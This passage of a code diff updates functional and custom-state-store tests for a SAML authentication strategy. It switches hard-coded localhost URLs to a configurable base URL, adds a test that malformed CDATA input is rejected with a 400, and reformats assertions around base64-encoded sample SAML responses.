nR3FoMXp5Qi9JUHFmMUtXOXFMbzhzaU9wRUlUU3BOeks3NSttMlc0L2c4TjJLTGgvb1MyeGEyTXZGU0pTemdZZmpwYjlOK3pVeE5XR0xjZDVQR2J6STdkYW4yY2tKSmE2UkhLRG1WTWtqYW1ZTHh6M0ZKK29SdUFhTzFpcjMzWGViSGV6ZHErQjRKT2FweVhleGs4M1hIbG1kS211UTg1aWdqRmZPVElHMmFJc2FXcTdDL0ppZmdyK0pqdVRoSm55TVdyYkNSRTV2VkZ0MEdJYWlvR1NsYktIM1RYUnhaK0tXdXozZ3ErWXIzSWNrT1RIRUgwR0FERy9pc2lQSWV4bHJHNmRZaW43V20vUGVkRGVzd0t5TFlwVFMxejNzVGVTSXRFbXpZSERNRURzS0FsNVh5anZOalJvNzg5OHVhRW5pMWIraWpCc2p5b01EY0RFaHcxZzhseWpIZldrSjRwRitIWGpuMzJBak9qb0ZuNVIrcWM1ZWpsTVVxV0N1OUU0UWJTZWtWbmcwSW02OG9naWF5WVVDQTlZQklSd0Y5b3l2REZ5WGRJblhFOFFsZDRkYks2dUpwM2xzbERkclNWczBZQTdxRnBQY0MrWWdFZnBEa2NraXVjR2RINTFWaHYrMmJNWEpabmdNMTU0Sm0rcUJ4MGhOd1R0K1AyMGZ6ZlpueDh2TEM5c3RxZUxPVm9lNFhlZzhQS01TdFQ1ei9yRGQrZk1nTVB2MHd5bWVybEM5ajJ4L0tMYnRTQmtNa0hkTXZjWVY0cjhJNkFCV0tvNE50QmhTYk8wdUcreDUwbjdkOTFhb1R1ZmhrM3plajV1dEM0ZElGRmdFMkZXMmdvcldzSTBBT0huVXJadlgrYmJxYmFZUFMyT05XSW9wcW1hVVUrVXZPUzcwM2Q4WWtjSGFyaTdFREE1dVFKVG5xT1I1YkpieFk3U0hjWEVmMFZFeldpcGgrL0FKMmYvSzJUVUhoNjZZMnpqdnM4cHdKZURKRUQ0U080OEZHMEtOTjk3UzN5NEJMdz09PC94ZW5jOkNpcGhlclZhbHVlPjwveGVuYzpDaXBoZXJEYXRhPjwveGVuYzpFbmNyeXB0ZWREYXRhPjwvc2FtbDI6RW5jcnlwdGVkQXNzZXJ0aW9uPjwvc2FtbDJwOlJlc3BvbnNlPg==' }\n       }, function(err, response, body) {\n         if(err) return done(err);\n\n@@ -166,7 +166,35 @@\ndescribe('samlp (functional tests)', function () {\n \n     it('should return a 400', function(){\n       expect(r.statusCode)\n-            .to.equal(400);\n+          .to.equal(400);\n+    });\n+\n+    it('should be recognized as an invalid xml', function(){\n+      var err = JSON.parse(bod);\n+      expect(err.message)\n+          .to.equal('SAMLResponse should be a valid xml');\n+    });\n+  });\n+\n+  describe('SAMLResponse with invalid CDATA', function() {\n+    var r, bod;\n+\n+    before(function (done) {\n+      request.post({\n+        jar: request.jar(),\n+        uri: `${server.BASE_URL}/callback/samlp-with-invalid-xml`,\n+        form: { SAMLResponse: Buffer.from('<doc><![CDATA[</doc>').toString('base64') }\n+      }, function(err, response, body) {\n+        if(err) return done(err);\n+        r = response;\n+        bod = body;\n+        done();\n+      });\n+    });\n+\n+    it('should return a 400', function(){\n+      expect(r.statusCode)\n+          .to.equal(400);\n     });\n \n     it('should be recognized as an invalid xml', function(){\n\n@@ -182,7 +210,7 @@\ndescribe('samlp (functional tests)', function () {\n     before(function (done) {\n       request.post({\n         jar: request.jar(),\n-        uri: 'http://localhost:5051/callback/samlp-with-utf8',\n+        uri: `${server.BASE_URL}/callback/samlp-with-utf8`,\n         form: { SAMLResponse: fs.readFileSync(path.join(__dirname, './samples/encoded/samlresponse_utf8.txt')).toString() }\n       }, function(err, response, body) {\n         if(err) return done(err);\n\n@@ -194,7 +222,7 @@\ndescribe('samlp (functional tests)', function () {\n \n     it('should be valid signature', function(){\n       expect(r.statusCode)\n-            .to.equal(200);\n+          .to.equal(200);\n     });\n \n     it('should return a valid user', function(){\n\n@@ -215,7 +243,7 @@\ndescribe('samlp (functional tests)', function () {\n \n       request.post({\n         jar: request.jar(),\n-        uri: 'http://localhost:5051/callback/samlp-with-ISO',\n+        uri: `${server.BASE_URL}/callback/samlp-with-ISO`,\n         form: { SAMLResponse: samlEncoded }\n       }, function(err, response, body) {\n         if(err) return done(err);\n\n@@ -227,7 +255,7 @@\ndescribe('samlp (functional tests)', function () {\n \n     it('should be valid signature', function(){\n       expect(r.statusCode)\n-            .to.equal(200);\n+          .to.equal(200);\n     });\n \n     it('should return a valid user', function(){\n\n@@ -248,7 +276,7 @@\ndescribe('samlp (functional tests)', function () {\n \n       request.post({\n         jar: request.jar(),\n-        uri: 'http://localhost:5051/callback/samlp-with-ISO-explicit',\n+        uri: `${server.BASE_URL}/callback/samlp-with-ISO-explicit`,\n         form: { SAMLResponse: samlEncoded }\n       }, function(err, response, body) {\n         if(err) return done(err);\n\n@@ -260,7 +288,7 @@\ndescribe('samlp (functional tests)', function () {\n \n     it('should be valid signature', function(){\n       expect(r.statusCode)\n-            .to.equal(200);\n+          .to.equal(200);\n     });\n \n     it('should return a valid user', function(){\n\n@@ -279,7 +307,7 @@\ndescribe('samlp (functional tests)', function () {\n     before(function (done) {\n       request.post({\n         jar: request.jar(),\n-        uri: 'http://localhost:5051/callback/samlp-with-dsig-at-root',\n+        uri: `${server.BASE_URL}/callback/samlp-with-dsig-at-root`,\n         form: { SAMLResponse: fs.readFileSync(path.join(__dirname, './samples/encoded/samlresponse_signedassertion_dsprefix.txt')).toString() }\n       }, function(err, response, body) {\n         if(err) return done(err);\n\n@@ -291,7 +319,7 @@\ndescribe('samlp (functional tests)', function () {\n \n     it('should be valid signature', function(){\n       expect(r.statusCode)\n-            .to.equal(200);\n+          .to.equal(200);\n     });\n   });\n\n@@ -301,7 +329,7 @@\ndescribe('samlp (functional tests)', function () {\n     before(function (done) {\n       request.post({\n         jar: request.jar(),\n-        uri: 'http://localhost:5051/callback',\n+        uri: `${server.BASE_URL}/callback`,\n         form: { SAMLResponse: 'foo' }\n       }, function(err, response, body) {\n         if(err) return done(err);\n\n@@ -313,7 +341,7 @@\ndescribe('samlp (functional tests)', function () {\n \n     it('should return a 400', function(){\n       expect(r.statusCode)\n-            .to.equal(400);\n+          .to.equal(400);\n     });\n   });\n\n@@ -325,7 +353,7 @@\ndescribe('samlp (functional tests)', function () {\n         request.get({\n           jar: request.jar(),\n           followRedirect: false,\n-          uri: 'http://localhost:5051/login'\n+          uri: `${server.BASE_URL}/login`\n         }, function (err, resp, b){\n           if(err) return done(err);\n           r = resp;\n\n@@ -336,38 +364,38 @@\ndescribe('samlp (functional tests)', function () {\n \n       it('should redirect to idp', function(){\n         expect(r.statusCode)\n-              .to.equal(302);\n+            .to.equal(302);\n       });\n \n       it('should have SAMLRequest querystring', function(done){\n         expect(r.headers.location.split('?')[0])\n-              .to.equal(server.identityProviderUrl);\n+            .to.equal(server.identityProviderUrl);\n         var querystring = qs.parse(r.headers.location.split('?')[1]);\n         expect(querystring).to.have.property('SAMLRequest');\n         var SAMLRequest = querystring.SAMLRequest;\n \n         zlib.inflateRaw(new Buffer(SAMLRequest, 'base64'), function (err, buffer) {\n           if (err) return done(err);\n           var request = buffer.toString();\n-          var doc = new xmldom.DOMParser().parseFromString(request);\n+          var doc = new xmldom.DOMParser().parseFromString(request, 'text/xml');\n \n           expect(doc.documentElement.getAttribute('ProtocolBinding'))\n-            .to.equal('urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST');\n+              .to.equal('urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST');\n \n           expect(doc.documentElement.getAttribute('Version'))\n-            .to.equal('2.0');\n+              .to.equal('2.0');\n \n           expect(doc.documentElement.getElementsByTagName('saml:Issuer')[0]\n-                                    .getAttribute('xmlns:saml'))\n-            .to.equal('urn:oasis:names:tc:SAML:2.0:assertion');\n+              .getAttribute('xmlns:saml'))\n+              .to.equal('urn:oasis:names:tc:SAML:2.0:assertion');\n \n           done();\n         });\n       });\n \n       it('should have RelayState querystring', function(){\n         expect(r.headers.location.split('?')[0])\n-              .to.equal(server.identityProviderUrl);\n+            .to.equal(server.identityProviderUrl);\n         var querystring = qs.parse(r.headers.location.split('?')[1]);\n         expect(querystring).to.have.property('RelayState');\n         expect(querystring.RelayState).to.equal(server.relayState);\n\n@@ -381,7 +409,7 @@\ndescribe('samlp (functional tests)', function () {\n         request.get({\n           jar: request.jar(),\n           followRedirect: false,\n-          uri: 'http://localhost:5051/login-http-post'\n+          uri: `${server.BASE_URL}/login-http-post`\n         }, function (err, resp, b){\n           if (err) return done(err);\n           r = resp;\n\n@@ -394,23 +422,23 @@\ndescribe('samlp (functional tests)', function () {\n       it('should post to idp', function(){\n         expect(r.statusCode).to.equal(200);\n         expect(r.headers['content-type']).to.contains('text/html');\n-        expect($('form').attr('action')).to.equal('http://localhost:5051/samlp');\n+        expect($('form').attr('action')).to.equal(`${server.BASE_URL}/samlp`);\n       });\n \n       it('should have SAMLRequest input', function (done) {\n         var SAMLRequest = $('form input[name=\"SAMLRequest\"]').val();\n         expect(SAMLRequest).to.be.ok;\n \n-        var doc = new xmldom.DOMParser().parseFromString(new Buffer(SAMLRequest, 'base64').toString());\n+        var doc = new xmldom.DOMParser().parseFromString(new Buffer(SAMLRequest, 'base64').toString(), 'text/xml');\n         expect(doc.documentElement.getAttribute('ProtocolBinding'))\n-          .to.equal('urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST');\n+            .to.equal('urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST');\n \n         expect(doc.documentElement.getAttribute('Version'))\n-          .to.equal('2.0');\n+            .to.equal('2.0');\n \n         expect(doc.documentElement.getElementsByTagName('saml:Issuer')[0]\n-                                  .getAttribute('xmlns:saml'))\n-          .to.equal('urn:oasis:names:tc:SAML:2.0:assertion');\n+            .getAttribute('xmlns:saml'))\n+            .to.equal('urn:oasis:names:tc:SAML:2.0:assertion');\n \n         done();\n       });\n\n@@ -430,7 +458,7 @@\ndescribe('samlp (functional tests)', function () {\n       request.get({\n         jar: request.jar(),\n         followRedirect: false,\n-        uri: 'http://localhost:5051/login-custom-request-template'\n+        uri: `${server.BASE_URL}/login-custom-request-template`\n       }, function (err, resp, b){\n         if(err) return done(err);\n         r = resp;\n\n@@ -441,32 +469,32 @@\ndescribe('samlp (functional tests)', function () {\n \n     it('should redirect to idp', function(){\n       expect(r.statusCode)\n-            .to.equal(302);\n+          .to.equal(302);\n     });\n \n     it('should have SAMLRequest querystring', function(done){\n       expect(r.headers.location.split('?')[0])\n-            .to.equal(server.identityProviderUrl);\n+          .to.equal(server.identityProviderUrl);\n       var querystring = qs.parse(r.headers.location.split('?')[1]);\n       expect(querystring).to.have.property('SAMLRequest');\n       var SAMLRequest = querystring.SAMLRequest;\n \n       zlib.inflateRaw(new Buffer(SAMLRequest, 'base64'), function (err, buffer) {\n         if (err) return done(err);\n         var request = buffer.toString();\n-        var doc = new xmldom.DOMParser().parseFromString(request);\n+        var doc = new xmldom.DOMParser().parseFromString(request, 'text/xml');\n \n         expect(doc.documentElement.getAttribute('Protocol'))\n-          .to.equal('urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST');\n+            .to.equal('urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST');\n \n         expect(doc.documentElement.getAttribute('Version'))\n-          .to.equal('3.0');\n+            .to.equal('3.0');\n \n         expect(doc.documentElement.getAttribute('Foo'))\n-          .to.equal('123');\n+            .to.equal('123');\n \n         expect(doc.documentElement.getAttribute('Issuertico'))\n-          .to.equal('https://auth0-dev-ed.my.salesforce.com');\n+            .to.equal('https://auth0-dev-ed.my.salesforce.com');\n \n         done();\n       });\n\n@@ -482,7 +510,7 @@\ndescribe('samlp (functional tests)', function () {\n       request.get({\n         jar: request.jar(),\n         followRedirect: false,\n-        uri: 'http://localhost:5051/login-idp-with-querystring'\n+        uri: `${server.BASE_URL}/login-idp-with-querystring`\n       }, function (err, resp, b){\n         if(err) return done(err);\n         r = resp;\n\n@@ -493,12 +521,12 @@\ndescribe('samlp (functional tests)', function () {\n \n     it('should redirect to idp', function(){\n       expect(r.statusCode)\n-            .to.equal(302);\n+          .to.equal(302);\n     });\n \n     it('should have SAMLRequest and foo in querystring', function(){\n       expect(r.headers.location.split('?')[0])\n-            .to.equal(server.identityProviderUrl);\n+          .to.equal(server.identityProviderUrl);\n       var querystring = qs.parse(r.headers.location.split('?')[1]);\n       expect(querystring).to.have.property('SAMLRequest');\n       expect(querystring).to.have.property('foo');\n\n@@ -508,14 +536,16 @@\ndescribe('samlp (functional tests)', function () {\n \n   describe('samlp with signed request', function () {\n     describe('POST binding', function () {\n-      var r, bod, $;\n+      let r, bod, $;\n \n       before(function (done) {\n         request.get({\n           jar: request.jar(),\n-          uri: 'http://localhost:5051/login-signed-request-post'\n+          uri: `${server.BASE_URL}/login-signed-request-post`\n         }, function (err, resp, b){\n-          if(err) return callback(err);\n+          if (err) {\n+            return done(err);\n+          }\n           r = resp;\n           bod = b;\n           $ = cheerio.load(bod);\n\n@@ -525,7 +555,7 @@\ndescribe('samlp (functional tests)', function () {\n \n       it('should return 200 with form element', function(){\n         expect(r.statusCode)\n-              .to.equal(200);\n+            .to.equal(200);\n       });\n \n       it('should have signed SAMLRequest with valid signature', function(done){\n\n@@ -534,15 +564,15 @@\ndescribe('samlp (functional tests)', function () {\n         var signingCert = fs.readFileSync(__dirname + '/test-auth0.pem');\n \n         expect(helpers.isValidSignature(signedRequest, signingCert))\n-          .to.equal(true);\n+            .to.equal(true);\n \n         done();\n       });\n \n       it('should show issuer before signature', function(done){\n         var signedSAMLRequest = $('form input[name=\"SAMLRequest\"]').val();\n         var signedRequest = new Buffer(signedSAMLRequest, 'base64').toString();\n-        var doc = new xmldom.DOMParser().parseFromString(signedRequest);\n+        var doc = new xmldom.DOMParser().parseFromString(signedRequest, 'text/xml');\n \n         // First child has to be the issuer\n         expect(doc.documentElement.childNodes[0].nodeName).to.equal('saml:Issuer');\n\n@@ -559,7 +589,7 @@\ndescribe('samlp (functional tests)', function () {\n         request.get({\n           jar: request.jar(),\n           followRedirect: false,\n-          uri: 'http://localhost:5051/login-signed-request-without-deflate'\n+          uri: `${server.BASE_URL}/login-signed-request-without-deflate`\n         }, function (err, resp, b){\n           if(err) return callback(err);\n           r = resp;\n\n@@ -570,12 +600,12 @@\ndescribe('samlp (functional tests)', function () {\n \n       it('should redirect to idp', function(){\n         expect(r.statusCode)\n-              .to.equal(302);\n+            .to.equal(302);\n       });\n \n       it('should have signed SAMLRequest with valid signature', function(done){\n         expect(r.headers.location.split('?')[0])\n-              .to.equal(server.identityProviderUrl);\n+            .to.equal(server.identityProviderUrl);\n         var querystring = qs.parse(r.headers.location.split('?')[1]);\n         expect(querystring).to.have.property('SAMLRequest');\n         expect(querystring.RelayState).to.equal('somestate');\n\n@@ -585,7 +615,7 @@\ndescribe('samlp (functional tests)', function () {\n         var signingCert = fs.readFileSync(__dirname + '/test-auth0.pem');\n \n         expect(helpers.isValidSignature(signedRequest, signingCert))\n-          .to.equal(true);\n+            .to.equal(true);\n         done();\n       });\n     });\n\n@@ -597,9 +627,9 @@\ndescribe('samlp (functional tests)', function () {\n         request.get({\n           jar: request.jar(),\n           followRedirect: false,\n-          uri: 'http://localhost:5051/login-signed-request-with-deflate'\n+          uri: `${server.BASE_URL}/login-signed-request-with-deflate`\n         }, function (err, resp, b){\n-          if(err) return callback(err);\n+          if(err) return done(err);\n           r = resp;\n           bod = b;\n           done();\n\n@@ -608,12 +638,12 @@\ndescribe('samlp (functional tests)', function () {\n \n       it('should redirect to idp', function(){\n         expect(r.statusCode)\n-              .to.equal(302);\n+            .to.equal(302);\n       });\n \n       it('should have signed SAMLRequest with valid signature', function(done){\n         expect(r.headers.location.split('?')[0])\n-              .to.equal(server.identityProviderUrl);\n+            .to.equal(server.identityProviderUrl);\n         var querystring = qs.parse(r.headers.location.split('?')[1]);\n         expect(querystring).to.have.property('SAMLRequest');\n         expect(querystring).to.have.property('Signature');\n\n@@ -646,7 +676,7 @@\nfunction doSamlpFlow(samlRequestUrl, callbackEndpoint, callback) {\n   }, function (err, response, b){\n     if(err) return callback(err);\n     expect(response.statusCode)\n-      .to.equal(200);\n+        .to.equal(200);\n \n     var $ = cheerio.load(b);\n     var SAMLResponse = $('input[name=\"SAMLResponse\"]').attr('value');\n\n@@ -661,4 +691,4 @@\nfunction doSamlpFlow(samlRequestUrl, callbackEndpoint, callback) {\n       callback(null, { response: response, body: body });\n     });\n   });\n-}\n+}\n\\ No newline at end of file\n```\n\nFilename: test/samlp.tests.js:\n```\n\n```\n\nFilename: test/state/samlp.state.custom.tests.js:\n```\n@@ -8,155 +8,155 @@\nchai.use(passport);\n describe('samlp - using custom session state store', function() {\n \n   var SAMLResponse = 'PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfOGU4ZGM1ZjY5YTk4Y2M0YzFmZjM0MjdlNWNlMzQ2MDZmZDY3MmY5MWU2IiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAxNC0wNy0xN1QwMTowMTo0OFoiIERlc3RpbmF0aW9uPSJodHRwOi8vc3AuZXhhbXBsZS5jb20vZGVtbzEvaW5kZXgucGhwP2FjcyIgSW5SZXNwb25zZVRvPSJPTkVMT0dJTl80ZmVlM2IwNDYzOTVjNGU3NTEwMTFlOTdmODkwMGI1MjczZDU2Njg1Ij4NCiAgPHNhbWw6SXNzdWVyPmh0dHA6Ly9pZHAuZXhhbXBsZS5jb20vbWV0YWRhdGEucGhwPC9zYW1sOklzc3Vlcj4NCiAgPHNhbWxwOlN0YXR1cz4NCiAgICA8c2FtbHA6U3RhdHVzQ29kZSBWYWx1ZT0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnN0YXR1czpTdWNjZXNzIi8+DQogIDwvc2FtbHA6U3RhdHVzPg0KICA8c2FtbDpBc3NlcnRpb24geG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSIgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiBJRD0iX2Q3MWEzYThlOWZjYzQ1YzllOWQyNDhlZjcwNDkzOTNmYzhmMDRlNWY3NSIgVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMTQtMDctMTdUMDE6MDE6NDhaIj4NCiAgICA8c2FtbDpJc3N1ZXI+aHR0cDovL2lkcC5leGFtcGxlLmNvbS9tZXRhZGF0YS5waHA8L3NhbWw6SXNzdWVyPg0KICAgIDxzYW1sOlN1YmplY3Q+DQogICAgICA8c2FtbDpOYW1lSUQgU1BOYW1lUXVhbGlmaWVyPSJodHRwOi8vc3AuZXhhbXBsZS5jb20vZGVtbzEvbWV0YWRhdGEucGhwIiBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpuYW1laWQtZm9ybWF0OnRyYW5zaWVudCI+X2NlM2QyOTQ4YjRjZjIwMTQ2ZGVlMGEwYjNkZDZmNjliNmNmODZmNjJkNzwvc2FtbDpOYW1lSUQ+DQogICAgICA8c2FtbDpTdWJqZWN0Q29uZmlybWF0aW9uIE1ldGhvZD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmNtOmJlYXJlciI+DQogICAgICAgIDxzYW1sOlN1YmplY3RDb25maXJtYXRpb25EYXRhIE5vdE9uT3JBZnRlcj0iMjAyNC0wMS0xOFQwNjoyMTo0OFoiIFJlY2lwaWVudD0iaHR0cDovL3NwLmV4YW1wbGUuY29tL2RlbW8xL2luZGV4LnBocD9hY3MiIEluUmVzcG9uc2VUbz0iT05FTE9HSU5fNGZlZTNiMDQ2Mzk1YzRlNzUxMDExZTk3Zjg5MDBiNTI3M2Q1NjY4NSIvPg0KICAgICAgPC9zYW1sOlN1YmplY3RDb25maXJtYXRpb24+DQogICAgPC9zYW1sOlN1YmplY3Q+DQogICAgPHNhbWw6Q29uZGl0aW9ucyBOb3RCZWZvcmU9IjIwMTQtMDctMTdUMDE6MDE6MThaIiBOb3RPbk9yQWZ0ZXI9IjIwMjQtMDEtMThUMDY6MjE6NDhaIj4NCiAgICAgIDxzYW1sOkF1ZGllbmNlUmVzdHJpY3Rpb24+DQogICAgICAgIDxzYW1sOkF1ZGllbmNlPmh0dHA6Ly9zcC5leGFtcGxlLmNvbS9kZW1vMS9tZXRhZGF0YS5waHA8L3NhbWw6QXVkaWVuY2U+DQogICAgICA8L3NhbWw6QXVkaWVuY2VSZXN0cmljdGlvbj4NCiAgICA8L3NhbWw6Q29uZGl0aW9ucz4NCiAgICA8c2FtbDpBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMTQtMDctMTdUMDE6MDE6NDhaIiBTZXNzaW9uTm90T25PckFmdGVyPSIyMDI0LTA3LTE3VDA5OjAxOjQ4WiIgU2Vzc2lvbkluZGV4PSJfYmU5OTY3YWJkOTA0ZGRjYWUzYzBlYjQxODlhZGJlM2Y3MWUzMjdjZjkzIj4NCiAgICAgIDxzYW1sOkF1dGhuQ29udGV4dD4NCiAgICAgICAgPHNhbWw6QXV0aG5Db250ZXh0Q2xhc3NSZWY+dXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjOmNsYXNzZXM6UGFzc3dvcmQ8L3NhbWw6QXV0aG5Db250ZXh0Q2xhc3NSZWY+DQogICAgICA8L3NhbWw6QXV0aG5Db250ZXh0Pg0KICAgIDwvc2FtbDpBdXRoblN0YXRlbWVudD4NCiAgICA8c2FtbDpBdHRyaWJ1dGVTdGF0ZW1lbnQ+DQogICAgICA8c2FtbDpBdHRyaWJ1dGUgTmFtZT0idWlkIiBOYW1lRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXR0cm5hbWUtZm9ybWF0OmJhc2ljIj4NCiAgICAgICAgPHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyI+dGVzdDwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT4NCiAgICAgIDwvc2FtbDpBdHRyaWJ1dGU+DQogICAgICA8c2FtbDpBdHRyaWJ1dGUgTmFtZT0ibWFpbCIgTmFtZUZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmF0dHJuYW1lLWZvcm1hdDpiYXNpYyI+DQogICAgICAgIDxzYW1sOkF0dHJpYnV0ZVZhbHVlIHhzaTp0eXBlPSJ4czpzdHJpbmciPnRlc3RAZXhhbXBsZS5jb208L3NhbWw6QXR0cmlidXRlVmFsdWU+DQogICAgICA8L3NhbWw6QXR0cmlidXRlPg0KICAgICAgPHNhbWw6QXR0cmlidXRlIE5hbWU9ImVkdVBlcnNvbkFmZmlsaWF0aW9uIiBOYW1lRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXR0cm5hbWUtZm9ybWF0OmJhc2ljIj4NCiAgICAgICAgPHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyI+dXNlcnM8L3NhbWw6QXR0cmlidXRlVmFsdWU+DQogICAgICAgIDxzYW1sOkF0dHJpYnV0ZVZhbHVlIHhzaTp0eXBlPSJ4czpzdHJpbmciPmV4YW1wbGVyb2xlMTwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT4NCiAgICAgIDwvc2FtbDpBdHRyaWJ1dGU+DQogICAgPC9zYW1sOkF0dHJpYnV0ZVN0YXRlbWVudD4NCiAgPC9zYW1sOkFzc2VydGlvbj4NCjwvc2FtbHA6UmVzcG9uc2U+';\n-  \n+\n   describe('that accepts meta argument', function() {\n     function CustomStore() {}\n \n     CustomStore.prototype.store = function(req, meta, cb) {\n       if (req.url === '/error') { return cb(new Error('something went wrong storing state')); }\n       if (req.url === '/exception') { throw new Error('something went horribly wrong storing state'); }\n-      \n+\n       if (req.url !== '/me') { return cb(new Error('incorrect req argument')); }\n       if (meta.identityProviderUrl !== 'http://www.example.com/samlp') { return cb(new Error('incorrect meta.identityProviderUrl argument')); }\n-      \n+\n       req.customStoreStoreCalled = req.customStoreStoreCalled ? req.customStoreStoreCalled++ : 1;\n       return cb(null, 'foos7473');\n     };\n-    \n+\n     CustomStore.prototype.verify = function(req, state, meta, cb) {\n       if (req.url === '/error') { return cb(new Error('something went wrong verifying state')); }\n       if (req.url === '/exception') { throw new Error('something went horribly wrong verifying state'); }\n-      \n+\n       if (state !== 'foos7473') { return cb(new Error('incorrect state argument')); }\n       if (meta.identityProviderUrl !== 'http://www.example.com/samlp') { return cb(new Error('incorrect meta.identityProviderUrl argument')); }\n-      \n+\n       req.customStoreVerifyCalled = req.customStoreVerifyCalled ? req.customStoreVerifyCalled++ : 1;\n       return cb(null, true);\n     };\n-    \n+\n     describe('issuing authorization request', function() {\n       var strategy = new Strategy({\n-        protocol: 'samlp',\n-        path: '/callback',\n-        realm: 'https://auth0-dev-ed.my.salesforce.com',\n-        identityProviderUrl: 'http://www.example.com/samlp',\n-        thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-        store: new CustomStore()\n-      },\n-      function() {});\n-      \n+            protocol: 'samlp',\n+            path: '/callback',\n+            realm: 'https://auth0-dev-ed.my.salesforce.com',\n+            identityProviderUrl: 'http://www.example.com/samlp',\n+            thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+            store: new CustomStore()\n+          },\n+          function() {});\n+\n       describe('that redirects to service provider', function() {\n         var request, url;\n-  \n+\n         before(function (done) {\n           chai.passport.use(strategy)\n-            .redirect(function(u) {\n-              url = u;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-              req.url = '/me';\n-            })\n-            .authenticate({});\n+              .redirect(function(u) {\n+                url = u;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+                req.url = '/me';\n+              })\n+              .authenticate({});\n         });\n-  \n+\n         it('should be redirected', function() {\n           expect(url).to.have.string('http://www.example.com/samlp?SAMLRequest=');\n           expect(url).to.have.string('&RelayState=foos7473');\n         });\n-      \n+\n         it('should serialize state using custom store', function() {\n           expect(request.customStoreStoreCalled).to.equal(1);\n         });\n       });\n-      \n+\n       describe('that errors due to custom store supplying error', function() {\n         var request, err;\n-  \n+\n         before(function (done) {\n           chai.passport.use(strategy)\n-            .error(function(e) {\n-              err = e;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-              req.url = '/error';\n-            })\n-            .authenticate({});\n+              .error(function(e) {\n+                err = e;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+                req.url = '/error';\n+              })\n+              .authenticate({});\n         });\n-  \n+\n         it('should error', function() {\n           expect(err).to.be.an.instanceof(Error);\n           expect(err.message).to.equal('something went wrong storing state');\n         });\n       });\n-      \n+\n       describe('that errors due to custom store throwing error', function() {\n         var request, err;\n-  \n+\n         before(function (done) {\n           chai.passport.use(strategy)\n-            .error(function(e) {\n-              err = e;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-              req.url = '/exception';\n-            })\n-            .authenticate({});\n+              .error(function(e) {\n+                err = e;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+                req.url = '/exception';\n+              })\n+              .authenticate({});\n         });\n-  \n+\n         it('should error', function() {\n           expect(err).to.be.an.instanceof(Error);\n           expect(err.message).to.equal('something went horribly wrong storing state');\n         });\n       });\n     });\n-    \n+\n     describe('processing response to authorization request', function() {\n       var strategy = new Strategy({\n-        protocol: 'samlp',\n-        path: '/callback',\n-        realm: 'https://auth0-dev-ed.my.salesforce.com',\n-        identityProviderUrl: 'http://www.example.com/samlp',\n-        thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-        store: new CustomStore()\n-      },\n-      function (profile, done) {\n-        return done(null, profile, { message: 'Hello' });\n-      });\n+            protocol: 'samlp',\n+            path: '/callback',\n+            realm: 'https://auth0-dev-ed.my.salesforce.com',\n+            identityProviderUrl: 'http://www.example.com/samlp',\n+            thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+            store: new CustomStore()\n+          },\n+          function (profile, done) {\n+            return done(null, profile, { message: 'Hello' });\n+          });\n \n-      strategy._samlp.validateSamlResponse = function(token, done) {\n-        expect(token).to.be.an('object');\n+      strategy._samlp.validateSamlResponse = function(token, _options, done) {\n+        expect(token).to.be.a('string');\n         done(null, { id: '1234' });\n       };\n-      \n+\n       describe('that was approved', function() {\n         var request, user, info;\n \n         before(function (done) {\n           chai.passport.use(strategy)\n-            .success(function(u, i) {\n-              user = u;\n-              info = i;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-          \n-              req.url = '/login';\n-              req.body = {};\n-              req.body.SAMLResponse = SAMLResponse;\n-              req.body.RelayState = 'foos7473';\n-              req.method = 'POST';\n-              req.get = function(){\n-                return '';\n-              };\n-            })\n-            .authenticate({});\n+              .success(function(u, i) {\n+                user = u;\n+                info = i;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.url = '/login';\n+                req.body = {};\n+                req.body.SAMLResponse = SAMLResponse;\n+                req.body.RelayState = 'foos7473';\n+                req.method = 'POST';\n+                req.get = function(){\n+                  return '';\n+                };\n+              })\n+              .authenticate({});\n         });\n \n         it('should supply user', function() {\n\n@@ -168,58 +168,58 @@\ndescribe('samlp - using custom session state store', function() {\n           